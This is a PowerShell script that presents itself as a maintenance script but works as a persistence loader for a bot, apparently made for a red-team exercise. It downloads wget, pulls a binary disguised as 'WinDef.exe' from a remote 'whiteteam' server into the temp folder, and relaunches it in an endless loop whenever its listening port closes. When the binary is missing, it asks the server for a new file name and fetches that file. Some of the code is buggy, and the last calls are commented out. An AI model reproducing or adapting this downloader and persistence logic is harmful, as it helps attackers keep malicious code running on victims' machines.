# powershell -ExecutionPolicy ByPass -File runYourselfEveryBlabla.ps1
# Maintenace script

$FIP = ""


function updatePort($FIP){
	$url = 'http://$FIP/whiteteam/port.html';
	$response = (Invoke-RestMethod -Uri $url).Trim();
	return $response;
}

function updateVName($FIP){
	$url = 'http://$FIP/whiteteam/index.html';
	$response = (Invoke-RestMethod -Uri $url).Trim();
	return $response;
}


function get_wget {
        $filename = "wget.exe"
        $wgetBinLocation = '' + $save_dir + '\' + $filename;
        #$client = New-Object System.Net.WebClient
        #https://eternallybored.org/misc/wget/
        write-host "Downloading Wget!"
        $url = "https://eternallybored.org/misc/wget/1.20/32/wget.exe"
        (New-Object System.Net.WebClient).DownloadFile($url, $wgetBinLocation)
        return $wgetBinLocation
}

"
Get $VName from $FIP /whiteteam/ and return the location
"
function get_dad($VName) {
$Location = '' + $save_dir + '\' + $VName;
Start-Process -FilePath $wgetBinLocation -Args " https://$FIP/whiteteam/WinDef.exe -O $Location" -passthru -NoNewWindow -Wait
return $Location
}

function Start-Mint($FLocation,$exefile,$PORT) {
  try
  {
    while ($true) {
		# Get the port that u the bot uses.
		$R = netstat -a | findstr LISTENING | findstr $PORT
		Write-Output $R
		Write-Output $R.length
		# If there is more than one line in the output That means you do not have to run the bin again.

		if ($R.length -gt 1) {
			Write-Output "It's open."
			# Do something if it's running


		} Else { # Else it should execute the Bin/WinDef.exe again.
 			#Start-Process -FilePath "1.ps1" -passthru -NoNewWindow -Wait
			Write-Output "$env:temp\1.ps1"

			# Check if a file exsit
			if ( Test-Path -Path $exefile){
				Start-Process -FilePath $exefile -passthru -NoNewWindow
			} Else {
				# If it does not exist get it from the server or Find another way to get a new file.
				# Maybe get a site and from the output, Trim() them then get the new name.

				$url = 'http://10.1.1.1/whiteteam/';
				$response = (Invoke-RestMethod -Uri $url).Trim();
				echo $response
				$exefile = get_dad $response
				Start-Mint $FLocation $exefile
			}
		}
		# Wait before it runs again
		Start-Sleep -Milliseconds 1200
    }
  }
  finally
  {
	Start-Mint
  }
}

# Get Wget
$wgetBinLocation = '' + $save_dir + '\wget.exe';
if (!(Test-Path $wgetBinLocation)){
	Write-Output "The file does not exist"
	$wgetBinLocation = get_wget
}




#Setup all values
$save_dir = $env:temp
$PORT = updatePort $FIP
$filename = updateVName $FIP
$exefile = '' + $save_dir + '\' + $filename;
#$save_path = '' + $save_dir + '\' + $filename;



# Get the location of the binrary in the LHost
#$FLocation = get_dad $filename
# Start the real work
#Start-Mint $FLocation $exefile $PORT
#echo "end"
